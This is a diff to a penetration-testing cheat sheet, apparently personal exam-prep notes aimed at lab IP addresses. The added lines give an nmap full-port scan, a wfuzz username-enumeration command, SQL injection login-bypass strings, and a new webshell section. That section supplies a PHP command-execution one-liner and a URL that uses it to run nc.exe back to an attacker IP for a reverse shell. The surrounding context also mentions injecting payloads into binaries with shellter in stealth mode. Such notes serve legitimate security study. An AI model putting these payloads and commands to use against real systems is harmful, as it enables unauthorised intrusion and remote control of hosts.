@@ -326,6 +326,7 @@ Try a high-access approach first, targeting systems with elevated rights such as
 Always check the /.ssh/ directory for RSA and authorized keys.
 Nmap
 -     autorecon <ip>  (best tool with UDP and TCP scan, you don’t want to use -sU -sT)
+-     nmap -v --max-retries=0 -T5 -p- 10.10.10.97 (check all open ports)
 -     nmap -A -Pn <ip> (Best Nmap command for initial access)
 -     nmap -sC -sV -A -T4 -Pn -o 101.nmap 192.168.10.10  ( * always check version for each port vsftp 3.02 exploitable search google or searchsploits)
 -     ·Test-NetConnection -Port 445 192.168.10.10 (check 445 is on) 1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.50.151", $)) "TCP port $ is open"} 2>$null    (check port 1 to 1024)   (for window)
@@ -367,6 +368,9 @@ Simply copy the version name of the website and search on Google to find an expl
 Furthermore, Nmap reveals some files such as robots.txt, index.html, index.php, login.php, phpinfo, cgi-sys, cgi-mod, and cgi-bin.
 If you encounter a host error, find a hostname with port 53 or discover a name in the website source code, footer, contact us, etc.
 Then add that discovered domain in the /etc/hosts file to access the site.
+
+Username Enum from error message:
+-     wfuzz -c -w /usr/share/seclists/Usernames/Names/names.txt -d "username=FUZZ&password=raman" --hs "username not found error message" http://10.10.16.3/login.php
 
 Content Discovery:
 -     gobuster dir -u http://192.168.10.10 -w  /wd/directory-list-2.3-big.txt (simple run)
@@ -427,6 +431,8 @@ SQLi:
 Pentestmonkey cheatsheet
 -     Try admin'# (valid username, see netsparker sqli cheatsheet)
 -     Try abcd' or 1=1;--
+-     Try ' 1 or 1=1;--
+-     Try 'OR 1 OR'
 -     Use UNION SELECT null,null,.. instead of 1,2,.. to avoid type conversion errors
 
 For mssql,
@@ -481,7 +487,7 @@ Always check guest login and then check public share with write and execute perm
 -     smbmap -H 192.168.10.10   (public shares) (check read write and execute)
 -     smbmap -H 192.168.10.10 -R tmp   (check specific folder like tmp)
 -     enum4linux -a 192.168.10.10   (best command to find details and users list)
--     smbclient -p 4455 -L //192.168.10.10/ -U raman --password=raman1234
+-     smbclient -p 4455 -L //192.168.10.10/ -U raman --password=raman1234 (linux)
 -     smbclient -p 4455 //192.168.10.10/scripts -U raman --password raman1234  (login)
 Port 3389 RDP
 There are two methods for this port: one involves finding credentials with another port, and the other employs brute force.
@@ -786,3 +792,9 @@ sudo fuser -k 443/tcp
 - Injecting a payload in a program using shellter
 - get an exe program from /usr/share/windows-binaries. Operation Mode A --> PE Target /usr/share/windows-binaries/whoami.exe --> Enable Stealth Mode --> Payload L then 1. Lastly launch msfconsole and /Multi/handler
 - 
+
+#WebShells 
+file upload
+if you can upload a file in ftp or smb server then upload nc.exe and shell.php "<?php system($GET['cmd']); ?>" then you can obtain a reverse shell
+-     http://10.10.10.97/shell.php?cmd=nc.exe 10.10.10.16.3 9001 cmd/powershell/bash....
+make a powershell shell ready from nishang and run a webserver then hit your webserver 
